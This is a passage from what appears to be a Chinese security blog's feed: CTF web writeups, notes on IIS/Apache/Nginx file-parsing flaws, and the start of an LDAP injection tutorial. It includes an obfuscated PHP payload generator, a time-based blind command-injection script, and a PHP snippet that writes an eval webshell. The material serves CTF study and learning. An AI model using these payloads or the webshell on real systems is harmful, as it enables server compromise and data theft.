class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">offset = <span class="number">3</span> + buff</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">base = <span class="number">65</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">_ascii = ord(payload[i])</span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (len(payload) + offset + <span class="number">15</span>))</span><br><span class="line">var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">res += var;</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> _ascii &gt; base:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(_ascii-base):</span><br><span class="line">tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">res += tmp</span><br><span class="line"></span><br><span class="line">first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line"><span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.构造STRTOLOWER并存进变量a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.构造SHOW_SOURCE并存进变量b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造/FLAG并存进变量c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#声明好abc变量</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.变量d = a(c) 则变量d为/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"></span><br><span class="line">print(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="ezflask">ezflask</h2><h3 id="TODO">TODO</h3><h2 id="Reference">Reference</h2><p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p><p><a href="http://phoebe233.cn/?p=248">http://phoebe233.cn/?p=248</a></p><p><a href="https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">https://rce.moe/2020/08/25/GeekPwn-2020-云上挑战赛-cosplay-writeup/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF八月赛-Web-Writeup&quot;&gt;DASCTF八月赛 Web Writeup&lt;/h1&gt;
&lt;h2 id=&quot;安恒大学&quot;&gt;安恒大学&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;渗透测试&lt;/li&gt;
&lt;li&gt;SQL报错注入&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>首届钓鱼城杯CTF比赛</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/</id>
    <published>2020-08-28T12:28:36.000Z</published>
    <updated>2020-09-06T13:04:20.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“钓鱼城杯”国际网络安全技能大赛Writeup">“钓鱼城杯”国际网络安全技能大赛Writeup</h1><h2 id="easyseed">easyseed</h2><p>index.bak：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用php_mt_rand随机数种子爆破。<br>用脚本生成php_mt_rand工具的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>爆破seed<br><img src="https://uploader.shimo.im/f/8B6zswJk3nmcP932.png!thumbnail" alt="图片"></p><p>再生成key值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="string">&#x27;718225&#x27;</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $lock.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;nRtqGR8mtd9ZOPyI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lock&#x27;</span>: <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies, headers=headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="easyweb">easyweb</h2><p>抓包</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906210414.png" alt=""></p><p>然后无回显命令执行，然后盲注一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://119.3.37.185/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;if [ `cut -c  &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;“钓鱼城杯”国际网络安全技能大赛Writeup&quot;&gt;“钓鱼城杯”国际网络安全技能大赛Writeup&lt;/h1&gt;
&lt;h2 id=&quot;easyseed&quot;&gt;easyseed&lt;/h2&gt;
&lt;p&gt;index.bak：&lt;/p&gt;
&lt;figure class=&quot;highlight php
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>服务器文件解析漏洞记录</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-19T05:26:06.000Z</published>
    <updated>2020-08-19T06:27:14.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务器文件解析漏洞记录">服务器文件解析漏洞记录</h1><p>没有新东西，简单记录一下。</p><blockquote><p><a href="https://www.anquanke.com/post/id/166616">https://www.anquanke.com/post/id/166616</a></p></blockquote><h2 id="0x01-IIS文件解析漏洞">0x01 IIS文件解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><h3 id="目录解析">目录解析</h3><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><p>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p><h3 id="文件解析">文件解析</h3><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p><p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><h3 id="补充">补充</h3><p>IIS6.0的解析漏洞同样存在于IIS7.5版本。</p><h2 id="0x02-Apache文件解析漏洞">0x02 Apache文件解析漏洞</h2><h3 id="多后缀">多后缀</h3><p>Apache1.x和2.x 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p><h3 id="conf配置">conf配置</h3><p>1、如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含 .php  即使文件名是 test2.php.jpg 也会以 php 来执行。</p><p>2、如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code>即使扩展名是 jpg，一样能以 php 方式执行。</p><h3 id="罕见后缀">罕见后缀</h3><p>Apache 配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当 php 程序执行的文件名要符合正则表达式，否则就算 Apache 把某文件当 php 程序，php 自己不认它，也是无用。</p><p>也就是说<code>php3，php4，php5，pht，phtml</code>也是可以被解析的。</p><h3 id="htaccess">.htaccess</h3><p>要想使 <code>.htaccess</code> 文件生效，需要两个条件:</p><p><strong>一是在 Apache 的配置文件中写上：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideAll</span><br></pre></td></tr></table></figure><p>若这样写则 <code>.htaccess</code> 不会生效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideNone</span><br></pre></td></tr></table></figure><p><strong>二是 Apache 要加载 mod_Rewrite 模块。加载该模块，需要在 Apache 的配置文件中写上：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure><p>若是在 Ubuntu 中，可能还需要执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoa2enmod rewrite</span><br></pre></td></tr></table></figure><p>配置完后需要重启 Apache。</p><p><strong>如在 <code>.htaccess</code> 文件中写入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-php xxx</span><br></pre></td></tr></table></figure><p>就成功地使该 <code>.htaccess</code> 文件所在目录及其子目录中的后缀为 .xxx 的文件被 Apache 当做 php 文件。</p><p>还有一种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch&quot;shell.jpg&quot;&gt;</span><br><span class="line"> SetHandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-Nginx文件解析漏洞">0x03 Nginx文件解析漏洞</h2><h3 id="PHP-CGI解析漏洞">PHP CGI解析漏洞</h3><p>漏洞原理参考：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819140421.png" alt=""></p><p>所以下面两种写法都会将1.jpg当作PHP来解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php  </span><br><span class="line"></span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure><p>另外一种手法：上传一个名字为 test.jpg，以下内容的文件:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问 <code>test.jpg/.php</code>, 在这个目录下就会生成一句话木马 shell.php。</p><h3 id="空字节代码执行漏洞">空字节代码执行漏洞</h3><p>恶意用户发出请求<code>http://example.com/file.ext％00.php</code>就会将 <code>file.ext</code> 作为 PHP 文件解析。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;服务器文件解析漏洞记录&quot;&gt;服务器文件解析漏洞记录&lt;/h1&gt;
&lt;p&gt;没有新东西，简单记录一下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/166616&quot;&gt;https://www.anq
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="服务器解析漏洞" scheme="http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>浅谈LDAP注入攻击</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</id>
    <published>2020-08-18T13:02:44.000Z</published>
    <updated>2020-08-18T13:05:53.816Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发于 安全客</p></blockquote><h1 id="从HTB靶机中浅谈LDAP注入攻击">从HTB靶机中浅谈LDAP注入攻击</h1><p>最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机，不得不说质量还是很高的。其中有一个靶机叫做<strong>CTF</strong>，难度是最高级别的insane，主要是它考察的知识点比较冷门——LDAP注入。可能很多小伙伴都没怎么听说过这个漏洞，我想主要原因还是LDAP这个协议用的比较少，而且国内CTF比赛中我也基本上没有看到有考察这个点的。在网上搜了一下，发现最近一次出现这个考点的是在<a href="https://ctftime.org/event/633">CSAW CTF Qualification Round 2018</a>比赛中，题目直接告诉你了是考LDAP注入。刚好上个星期我在星盟内部分享中，也提到了这个知识点，那么本着聊胜于无，开阔知识面的本意下（其实是偷懒？），写下这篇浅谈LDAP注入攻击的文章。</p><h2 id="0x01-LDAP介绍">0x01 LDAP介绍</h2><h3 id="什么是LDAP">什么是LDAP</h3><p>在做靶机之前，我们首先来了解一下什么是LDAP？</p><blockquote><p>以下内容部分摘自2018 blackhat <em>LDAP Injection &amp; Blind LDAP Injection</em></p></blockquote><p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p><p>那么转换成人话就是说，LDAP是用于访问目录服务（特别是基于X.500的目录服务）的轻量级客户端服务器协议，它通过TCP/IP传输服务运行。关键的地方就在于，<strong>数据是存储在目录中，而不是数据库中</strong>。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？</p><p>最重要的区别就是<strong>目录适合于存放静态数据</strong>，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。</p><p>说了这么半天，感觉还是贴一张图来的更快。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721143738.png" alt=""></p><p>上面这张图展示了LDAP的结构。我们都知道MySQL数据库中的数据都是按记录一条条记录存在表中，而LDAP是树结构的，数据存储在叶子节点上。比如要描述上图<code>baby</code>这个节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org</span><br></pre></td></tr></table></figure><h3 id="LDAP的基本概念">LDAP的基本概念</h3><p>在大概知道LDAP是做什么、长什么样之后，我们再来了解一下LDAP的一些基本概念，主要是三个专有名词：条目（Entry）、属性（Attribute）、对象类（ObjectClass）。</p><p><strong>条目</strong></p><p>条目，也叫记录项，是LDAP中最基本的颗粒，就想字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。</p><p><strong>属性</strong></p><p>每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。</p><p>此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。</p><p><strong>对象类</strong></p><p>对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。</p><p>通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。</p><p>是不是听起来和面向对象语言有点相似，跟Java中的Object类一样，LDAP的根对象类就叫做top。</p><p>上述就是笔者对LDAP数据结构的简单介绍了，LDAP既然主要用于搜索查询，那它是怎么查询的呢？</p><h3 id="LDAP的基本语法">LDAP的基本语法</h3><p>LDAP的语法非常简单，一看就会，再看就懂。</p><blockquote><p>以下部分内容摘自https://blog.csdn.net/leader_ww/article/details/4028672</p></blockquote><p><strong>=（等于）</strong></p><p>例如，如果希望查找属性<code>giveNname</code>值为John的所有对象，可以使用<code>(givenName=John)</code>。这会返回对应条件的所有对象。</p><p><strong>&amp;（逻辑与）</strong></p><p>例如，如果希望查找居住在 Dallas 并且<code>givenName</code>为John的所有对象，可以使用<code>(&amp;(givenName=John)(l=Dallas))</code>。</p><p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 